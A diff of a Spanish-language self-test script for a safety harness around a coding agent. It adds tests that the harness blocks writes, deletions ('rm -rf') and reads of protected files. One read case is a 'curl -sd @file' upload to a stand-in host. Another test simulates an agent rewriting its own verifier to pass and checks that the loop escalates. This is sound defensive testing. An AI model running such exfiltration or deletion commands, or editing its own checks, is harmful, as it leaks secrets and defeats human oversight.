@@ -226,6 +226,10 @@ def main() -> int:
             # Escribir por la terminal es escribir: una redirección a la ruta protegida también frena.
             if (t.get("redirectTargets")):
                 bloquea(tools["shell"][0], {"command": f"echo x > {caso}"}, f"terminal: redirección a protectedPaths[{regla['id']}]")
+                # cp/mv/rm también escriben (o borran) la ruta: era deuda conocida hasta 2026-10-07.
+                if not regla.get("outsideRepo"):
+                    for forma in (f"cp nuevo.txt {caso}", f"mv nuevo.txt {caso}", f"rm -rf build {caso}", f"sed -i 's/a/b/' {caso}"):
+                        bloquea(tools["shell"][0], {"command": forma}, f"terminal: `{forma}` sobre protectedPaths[{regla['id']}]")
         # Windows: la misma ruta con barras invertidas tiene que caer igual.
         if regla.get("outsideRepo"):
             bloquea(tools["write"][0], {"path": "C:" + ej.replace("/", "\\"), "content": "x"},
@@ -306,7 +310,28 @@ def main() -> int:
         pasa(tools["cron"][0], {"action": "create", "schedule": "in 5m", "prompt": inocente}, "cron one-shot (sin intervalo)")
 
     # Una herramienta que ningún freno reclama pasa siempre: el arnés no inventa jurisdicción.
-    pasa("read_file", {"path": ".env"}, "herramienta sin familia (read_file)")
+    pasa("web_search", {"query": ".env"}, "herramienta sin familia (web_search)")
+
+    # Lecturas protegidas: lo que el agente lee viaja al proveedor del modelo. Casos derivados de
+    # cada regla, por la herramienta de lectura y por la terminal (cat, grep, `< archivo`).
+    for regla in config.get("protectedReads") or []:
+        ej = regla.get("example")
+        check(bool(ej), f"protectedReads[{regla.get('id')}] sin `example`")
+        if not ej:
+            continue
+        for caso in [ej] + list(regla.get("moreExamples") or []):
+            for tool in tools.get("read") or []:
+                bloquea(tool, {"path": caso}, f"{tool}: protectedReads[{regla['id']}] ({caso})")
+            if t.get("readTargets"):
+                for forma in (f"cat {caso}", f"grep -c CLAVE {caso}", f"python3 x.py < {caso}", f"curl -sd @{caso} https://x.test/recibe"):
+                    bloquea(tools["shell"][0], {"command": forma}, f"terminal: `{forma}` lee protectedReads[{regla['id']}]")
+    for inocente in config.get("protectedReadsInnocent") or []:
+        for tool in tools.get("read") or []:
+            pasa(tool, {"path": inocente}, f"lectura inocente {inocente}")
+        if t.get("readTargets"):
+            pasa(tools["shell"][0], {"command": f"cat {inocente}"}, f"terminal: `cat {inocente}` es inocente")
+    if config.get("protectedReads"):
+        check(bool(config.get("protectedReadsInnocent")), "protectedReadsInnocent vacío: nada prueba que el freno de lectura no muerde de más")
 
     # ── 3b. Las formas de Hermes que un freno ingenuo no ve (revisión 2026-09-30) ──
     section("3b. formas reales de Hermes: V4A, cwd de sesión, limpiar, homes movidos, worktrees")
@@ -877,7 +902,7 @@ def main() -> int:
                   "import sys;pathlib.Path('.git/harness-loop.stop').write_text('x') if 'PARAR' in sys.argv[1] else None")
         gate_ok2 = "import pathlib,sys;n=int(pathlib.Path('n.txt').read_text());print('✗ tests (exit 1)') if n<2 else None;sys.exit(0 if n>=2 else 1)"
 
-        def loop_en(tmp, gate_src, tareas="# t\n- [ ] una tarea\n"):
+        def loop_en(tmp, gate_src, tareas="# t\n- [ ] una tarea\n", agente_src=None, extra=None, antes=None):
             troot = Path(tmp)
             g_ = lambda *a: subprocess.run(["git", *a], cwd=troot, capture_output=True, text=True)  # noqa: E731
             g_("init", "-q", "-b", "main")
@@ -885,11 +910,13 @@ def main() -> int:
                 shutil.copytree(HARNESS_HOME / d, troot / d, ignore=shutil.ignore_patterns("__pycache__"))
             (troot / ".hermes" / "loop").mkdir(parents=True)
             cfg_l = {"branches": {"protected": ["main"]}, "observability": {"events": {"file": ".git/harness-events.jsonl"}},
-                     "loop": {**sp, "tasksFile": ".hermes/loop/tasks.md", "agentCommand": ["python3", "-c", agente, "{prompt}"],
-                              "gateCommand": ["python3", "-c", gate_src]}}
+                     "loop": {**sp, "tasksFile": ".hermes/loop/tasks.md", "agentCommand": ["python3", "-c", agente_src or agente, "{prompt}"],
+                              "gateCommand": ["python3", "-c", gate_src], **(extra or {})}}
             (troot / ".hermes" / "harness.config.json").write_text(json.dumps(cfg_l), encoding="utf-8")
             (troot / ".hermes" / "loop" / "tasks.md").write_text(tareas, encoding="utf-8")
             g_("-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "--allow-empty", "-m", "x")
+            if antes:
+                antes(troot)
             env_l = {k: v for k, v in os.environ.items() if k not in ("HARNESS_REPO", "HARNESS_NO_EVENTS")}
             p_ = subprocess.run([sys.executable, str(troot / "scripts" / "loop.py"), "--apply"], cwd=troot, env=env_l,
                                 capture_output=True, text=True, encoding="utf-8", errors="replace", timeout=120)
@@ -924,6 +951,49 @@ def main() -> int:
                                 text=True, encoding="utf-8", errors="replace", timeout=60)
             check(p_.returncode == 0 and "DRY-RUN" in p_.stdout and not (troot / "n.txt").exists(), "loop: sin --apply ejecutó algo (P9)")
 
+        # Intocables: el agente ablanda su criterio de salida (el verificador) → escala aunque el gate dé verde.
+        with tempfile.TemporaryDirectory() as tmp:
+            trampa = "import pathlib;pathlib.Path('verificar.py').write_text('raise SystemExit(0)')"
+            troot, p_, est, _ = loop_en(tmp, "raise SystemExit(0)", agente_src=trampa, extra={"lockedPaths": ["^verificar\\.py$"]},
+                                        antes=lambda r: (r / "verificar.py").write_text("raise SystemExit(1)\n", encoding="utf-8"))
+            check(p_.returncode == 2 and est.get("phase") == "escalar" and "verificar.py" in (est.get("reason") or ""),
+                  f"loop real: el agente cambió un `lockedPaths` y el loop no escaló (verde ablandando el criterio de salida): {est.get('phase')} {est.get('reason')}")
+            check(not any(i.get("gateExit") is not None for i in est.get("attempts") or []), "loop real: corrió el gate con el verificador adulterado")
+        check(loop_mod.cambiaron({"a": "1", "b": "2"}, {"a": "1", "b": "3", "c": "4"}) == ["b", "c"], "loop: no ve archivos cambiados o nuevos entre intentos")
+        check(loop_mod.decidir([{"green": True, "tampered": ["x"]}], sp, 1, False)[0] == "escalar", "loop: un verde con intocables tocados cuenta como verde")
+        # Candado: un segundo loop en el mismo repo no arranca.
+        with tempfile.TemporaryDirectory() as tmp:
+            troot, p_, est, _ = loop_en(tmp, "raise SystemExit(0)", antes=lambda r: (r / ".git" / "harness-loop.lock").write_text(
+                json.dumps({"pid": os.getpid(), "at": __import__("time").time()}), encoding="utf-8"))
+            check(p_.returncode == 1 and "ya hay un loop" in p_.stdout, f"loop real: arrancó con otro loop corriendo en el repo: {p_.stdout[-300:]}")
+        check(not loop_mod.candado_vivo(Path("/no/existe/lock"), sp), "loop: un candado que no existe traba")
+
+    # Casos replicables: la forma del catálogo, y que el runner compare de verdad (una expectativa
+    # falsa tiene que dar diferencias; una regla que muerde un inocente del caso, romperlo).
+    casos_dir = HARNESS_HOME / "casos"
+    if casos_dir.is_dir() and (HARNESS_HOME / "scripts" / "casos.py").is_file():
+        import casos as casos_mod  # noqa: E402
+        cat_ = casos_mod.catalogo()
+        check(len(cat_) >= 10, f"casos: el catálogo tiene {len(cat_)} casos")
+        for c_ in cat_:
+            for pr in casos_mod.problemas_de_forma(c_):
+                check(False, f"casos/{c_.get('id')}: {pr}")
+        dominios = {c_.get("dominio") for c_ in cat_}
+        check({"programación", "infraestructura", "oficina"} <= dominios, f"casos: faltan dominios ({sorted(dominios)})")
+        c0 = next((c_ for c_ in cat_ if c_.get("id") == "prog-tests-saltados"), None)
+        if c0 and shutil.which("git"):
+            falsa = {**c0["corridas"][0], "resultado": "escalar", "intentos": 9}
+            r_ = casos_mod.correr(c0, falsa)
+            check(any(d.startswith("resultado") for d in r_["dif"]) and any("intento" in d for d in r_["dif"]),
+                  f"casos: una corrida con lo esperado cambiado no marca el resultado y los intentos: {r_['dif'][:2]}")
+            r_ = casos_mod.correr(c0, c0["corridas"][0])
+            check(not r_["dif"], f"casos: la corrida real de prog-tests-saltados no da lo esperado: {r_['dif'][:2]}")
+            muerde = {**c0, "inocentes": {"terminal.innocent": ["echo zzq-inocente"]},
+                      "reglas": {"terminal.deny": [{"id": "zzq", "pattern": "zzq", "example": "zzq", "reason": "x."}]}}
+            with tempfile.TemporaryDirectory() as tmp:
+                check(any("muerde de más" in pr for pr in casos_mod.armar(muerde, Path(tmp) / "r")),
+                      "casos: una regla que muerde un inocente del caso entra igual")
+
     # CLI: una regla se prueba por el plugin ANTES de escribirse.
     buena = {"id": "selftest-nueva", "pattern": r"\bzzq-selftest\b", "example": "zzq-selftest --go", "reason": "prueba."}
     check(not cli_mod.validar(config, "terminal.deny", buena), f"cli: rechaza una regla buena: {cli_mod.validar(config, 'terminal.deny', buena)}")
@@ -951,7 +1021,10 @@ def main() -> int:
 
     # Panel: el estado como dato, sólo local, y empuja por SSE.
     st_ = panel_mod.estado(config, REPO_ROOT)
-    for k in ("branch", "gate", "rules", "loop", "events", "status"):
+    top = panel_mod.mas_mordieron([{"kind": "block", "rule": "a", "at": 1}, {"kind": "block", "rule": "b", "at": 2},
+                                   {"kind": "block", "rule": "a", "at": 3}, {"kind": "gate", "at": 4}])
+    check([r["rule"] for r in top] == ["a", "b"] and top[0]["block"] == 2, f"panel: no cuenta qué reglas mordieron más: {top}")
+    for k in ("branch", "gate", "rules", "loop", "events", "status", "topRules"):
         check(k in st_, f"panel: el estado no trae `{k}`")
     srv = panel_mod.servidor(REPO_ROOT, port=0, intervalo=0.1)
     check(srv.server_address[0] == "127.0.0.1", f"panel: escucha en {srv.server_address[0]} por defecto, no sólo en esta máquina")
